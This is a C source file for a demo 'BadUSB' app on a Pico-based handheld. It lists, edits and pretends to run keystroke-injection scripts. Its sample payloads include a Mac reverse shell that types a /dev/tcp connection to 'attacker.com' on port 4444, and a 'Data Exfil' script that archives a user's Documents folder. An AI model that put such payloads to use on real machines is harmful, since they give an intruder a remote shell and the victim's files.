#include "app.h"
#include "../display.h"
#include "../keys.h"
#include "../board_pins.h"
#include "pico/stdlib.h"
#include "hardware/flash.h"
#include "hardware/sync.h"
#include "pico/multicore.h"
#include "pico/bootrom.h"
#include "tusb.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FLASH_TARGET_OFFSET (1024 * 1024) // 1MB offset into flash
#define MAX_PAYLOAD_SIZE 4096
#define MAX_PAYLOADS 5
#define PAYLOAD_METADATA_SIZE 256

typedef struct {
    int selected_payload;
    int num_payloads;
    char payload_names[MAX_PAYLOADS][32];
    uint32_t payload_sizes[MAX_PAYLOADS];
    uint32_t payload_offsets[MAX_PAYLOADS];
    bool executing;
    char status_message[64];
    int edit_mode;  // 0=browse, 1=edit name, 2=edit payload
    char edit_buffer[MAX_PAYLOAD_SIZE];
} badusb_data_t;

static app_t badusb_app;
static badusb_data_t badusb_data;

static void badusb_init(app_t* app);
static void badusb_update(app_t* app);
static void badusb_render(app_t* app);
static void badusb_process_key(app_t* app, uint8_t key_code);
static void badusb_destroy(app_t* app);

static void load_payload_metadata(badusb_data_t* data);
static void load_payload(badusb_data_t* data, int index);
static void save_payload(badusb_data_t* data, int index);
static void execute_payload(badusb_data_t* data, int index);
static void render_payload_list(badusb_data_t* data);
static void render_payload_editor(badusb_data_t* data);

app_t* register_badusb_app(void) {
    badusb_app.name = "BadUSB";
    badusb_app.icon = "B";
    badusb_app.app_data = &badusb_data;
    badusb_app.init = badusb_init;
    badusb_app.update = badusb_update;
    badusb_app.render = badusb_render;
    badusb_app.process_key = badusb_process_key;
    badusb_app.destroy = badusb_destroy;
    
    return &badusb_app;
}

static void badusb_init(app_t* app) {
    badusb_data_t* data = (badusb_data_t*)app->app_data;
    
    data->selected_payload = 0;
    data->executing = false;
    data->edit_mode = 0;
    strcpy(data->status_message, "Loading payloads...");
    
    load_payload_metadata(data);
}

static void badusb_update(app_t* app) {
    badusb_data_t* data = (badusb_data_t*)app->app_data;
    
    if (data->executing) {
        if (!tud_mounted()) {
            strcpy(data->status_message, "USB not connected");
            data->executing = false;
        }
    }
}

static void badusb_render(app_t* app) {
    badusb_data_t* data = (badusb_data_t*)app->app_data;
    
    // Draw header
    display_fill_rect(0, 0, DISPLAY_WIDTH, 40, COLOR_DARKGRAY);
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 15, "BadUSB", FONT_LARGE, ALIGN_CENTER, COLOR_WHITE);
    
    // Draw status message
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 40, data->status_message, FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
    
    // Draw content based on mode
    if (data->edit_mode == 0) {
        render_payload_list(data);
    } else {
        render_payload_editor(data);
    }
    
    // Draw footer with controls
    display_fill_rect(0, DISPLAY_HEIGHT - 30, DISPLAY_WIDTH, 30, COLOR_DARKGRAY);
    
    if (data->edit_mode == 0) {
        display_draw_text(10, DISPLAY_HEIGHT - 20, "5:Run 6:Edit 0:Back", FONT_SMALL, COLOR_WHITE);
    } else {
        display_draw_text(10, DISPLAY_HEIGHT - 20, "5:Save 0:Cancel", FONT_SMALL, COLOR_WHITE);
    }
}

static void badusb_process_key(app_t* app, uint8_t key_code) {
    badusb_data_t* data = (badusb_data_t*)app->app_data;
    
    if (data->edit_mode == 0) {
        // Payload list mode
        switch (key_code) {
            case KEY_2: // Up
                if (data->selected_payload > 0) {
                    data->selected_payload--;
                }
                break;
                
            case KEY_8: // Down
                if (data->selected_payload < data->num_payloads - 1) {
                    data->selected_payload++;
                }
                break;
                
            case KEY_5: // Run selected payload
                if (data->selected_payload < data->num_payloads) {
                    execute_payload(data, data->selected_payload);
                }
                break;
                
            case KEY_6: // Edit selected payload
                if (data->selected_payload < data->num_payloads) {
                    data->edit_mode = 2; // Edit payload
                    load_payload(data, data->selected_payload);
                }
                break;
                
            case KEY_0: // Back to launcher
                app_manager_return_to_launcher();
                break;
                
            default:
                break;
        }
    } else {
        // Editor mode - simplified for this example
        // In a real implementation, you'd have a proper text editor
        
        switch (key_code) {
            case KEY_5: // Save changes
                save_payload(data, data->selected_payload);
                data->edit_mode = 0;
                strcpy(data->status_message, "Payload saved");
                break;
                
            case KEY_0: // Cancel editing
                data->edit_mode = 0;
                strcpy(data->status_message, "Edit cancelled");
                break;
                
            default:
                break;
        }
    }
}

static void badusb_destroy(app_t* app) {
    badusb_data_t* data = (badusb_data_t*)app->app_data;
    
    // Stop any executing payload
    if (data->executing) {
        data->executing = false;
    }
}

static void load_payload_metadata(badusb_data_t* data) {
    // In a real implementation, this would read from flash
    // For this example, we'll create some dummy payloads
    
    data->num_payloads = 3;
    
    strcpy(data->payload_names[0], "Windows Rickroll");
    data->payload_sizes[0] = 100;
    data->payload_offsets[0] = 0;
    
    strcpy(data->payload_names[1], "Mac Reverse Shell");
    data->payload_sizes[1] = 200;
    data->payload_offsets[1] = 4096;
    
    strcpy(data->payload_names[2], "Linux Data Exfil");
    data->payload_sizes[2] = 150;
    data->payload_offsets[2] = 8192;
    
    strcpy(data->status_message, "Ready");
}

static void load_payload(badusb_data_t* data, int index) {
    if (index < 0 || index >= data->num_payloads) {
        return;
    }
    
    // In a real implementation, this would read from flash
    // For this example, we'll create dummy content
    
    switch (index) {
        case 0:
            strcpy(data->edit_buffer, "REM Windows Rickroll\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING start https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER");
            break;
        case 1:
            strcpy(data->edit_buffer, "REM Mac Reverse Shell\nDELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING bash -i >& /dev/tcp/attacker.com/4444 0>&1\nENTER");
            break;
        case 2:
            strcpy(data->edit_buffer, "REM Linux Data Exfil\nDELAY 1000\nALT F2\nDELAY 500\nSTRING gnome-terminal\nENTER\nDELAY 1000\nSTRING tar -czf /tmp/data.tar.gz ~/Documents\nENTER");
            break;
    }
    
    strcpy(data->status_message, "Payload loaded");
}

static void save_payload(badusb_data_t* data, int index) {
    if (index < 0 || index >= data->num_payloads) {
        return;
    }
    
    // In a real implementation, this would write to flash
    // For this example, we'll just update the size
    
    data->payload_sizes[index] = strlen(data->edit_buffer);
    
    strcpy(data->status_message, "Payload saved");
}

static void execute_payload(badusb_data_t* data, int index) {
    if (index < 0 || index >= data->num_payloads) {
        return;
    }
    
    // Load the payload
    load_payload(data, index);
    
    // In a real implementation, this would execute the payload via USB HID
    // For this example, we'll just show a message
    
    sprintf(data->status_message, "Executing: %s", data->payload_names[index]);
    data->executing = true;
    
    // After a delay, we'll simulate completion
    // In a real app, this would be handled in the update function
    sleep_ms(2000);
    data->executing = false;
    strcpy(data->status_message, "Execution complete");
}

static void render_payload_list(badusb_data_t* data) {
    // Draw payload list
    int y = 60;
    
    for (int i = 0; i < data->num_payloads; i++) {
        // Background for payload item
        uint16_t bg_color = (i == data->selected_payload) ? COLOR_BLUE : COLOR_DARKGRAY;
        display_fill_rect(10, y, DISPLAY_WIDTH - 20, 30, bg_color);
        display_draw_rect(10, y, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
        
        // Payload name
        display_draw_text(20, y + 10, data->payload_names[i], FONT_MEDIUM, COLOR_WHITE);
        
        // Payload size
        char size_str[16];
        sprintf(size_str, "%lu B", data->payload_sizes[i]);
        display_draw_text_aligned(DISPLAY_WIDTH - 30, y + 10, size_str, FONT_SMALL, ALIGN_RIGHT, COLOR_LIGHTGRAY);
        
        y += 40;
    }
    
    // Add new payload button
    if (data->num_payloads < MAX_PAYLOADS) {
        display_fill_rect(10, y, DISPLAY_WIDTH - 20, 30, COLOR_GREEN);
        display_draw_rect(10, y, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
        display_draw_text_aligned(DISPLAY_WIDTH / 2, y + 10, "Add New Payload", FONT_MEDIUM, ALIGN_CENTER, COLOR_WHITE);
    }
}

static void render_payload_editor(badusb_data_t* data) {
    // Draw editor area
    display_fill_rect(5, 50, DISPLAY_WIDTH - 10, DISPLAY_HEIGHT - 90, COLOR_BLACK);
    display_draw_rect(5, 50, DISPLAY_WIDTH - 10, DISPLAY_HEIGHT - 90, COLOR_WHITE);
    
    // Draw payload name
    display_draw_text(10, 60, data->payload_names[data->selected_payload], FONT_MEDIUM, COLOR_YELLOW);
    
    // Draw payload content (simplified - just first few lines)
    int y = 90;
    char* line_start = data->edit_buffer;
    char line_buffer[64];
    int line_count = 0;
    
    while (*line_start && line_count < 6) {
        char* line_end = strchr(line_start, '\n');
        int line_length;
        
        if (line_end) {
            line_length = line_end - line_start;
            if (line_length > 63) line_length = 63;
            strncpy(line_buffer, line_start, line_length);
            line_buffer[line_length] = '\0';
            line_start = line_end + 1;
        } else {
            strcpy(line_buffer, line_start);
            line_start += strlen(line_start);
        }
        
        display_draw_text(15, y, line_buffer, FONT_SMALL, COLOR_WHITE);
        y += 20;
        line_count++;
    }
    
    // Indicate if there are more lines
    if (*line_start) {
        display_draw_text_aligned(DISPLAY_WIDTH / 2, y, "...", FONT_MEDIUM, ALIGN_CENTER, COLOR_LIGHTGRAY);
    }
    
    // Draw note about simplified editor
    display_draw_text_aligned(DISPLAY_WIDTH / 2, DISPLAY_HEIGHT - 60, 
                             "Editor functionality limited in demo", FONT_SMALL, ALIGN_CENTER, COLOR_RED);
}
